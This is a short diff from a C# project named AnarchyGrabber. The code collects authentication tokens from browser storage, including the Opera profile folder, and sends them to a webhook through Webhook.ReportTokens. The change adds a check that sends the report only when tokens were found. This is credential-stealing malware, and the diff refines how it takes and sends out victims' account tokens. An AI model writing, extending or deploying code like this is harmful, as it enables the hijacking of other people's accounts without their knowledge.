@@ -18,12 +18,15 @@ namespace AnarchyGrabber
             report.Add("\n**Opera**");
             report.AddRange(Grabber.GetTokens(@"Roaming\Opera Software\Opera Stable", true));
 
-            //attempts to report the tokens to the user
-            try
+            if (Grabber.TokensFound)
             {
-                Webhook.ReportTokens(report);
+                //attempts to report the tokens to the user
+                try
+                {
+                    Webhook.ReportTokens(report);
+                }
+                catch { }
             }
-            catch { }
         }
     }
 }
